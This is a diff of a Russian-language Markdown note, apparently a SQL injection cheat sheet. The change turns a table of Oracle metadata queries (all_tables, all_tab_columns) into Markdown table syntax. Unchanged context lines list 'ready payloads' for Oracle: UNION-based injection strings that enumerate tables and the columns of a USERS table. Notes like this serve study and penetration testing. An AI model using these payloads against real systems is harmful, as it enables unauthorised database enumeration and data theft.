@@ -113,9 +113,10 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ### Анализ базы данных в Oracle
 В Oracle нет information_schema. Используй другие представления:<br>
 
-Что узнать	Запрос
-Список таблиц	SELECT * FROM all_tables
-Столбцы таблицы	SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+| Что узнать | Запрос |
+| :--- | :--- |
+| Список таблиц | `SELECT * FROM all_tables` |
+| Столбцы таблицы | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
 ### Готовые payload'ы для Oracle:
 - ' UNION SELECT table_name, NULL FROM all_tables--<br>
 - ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
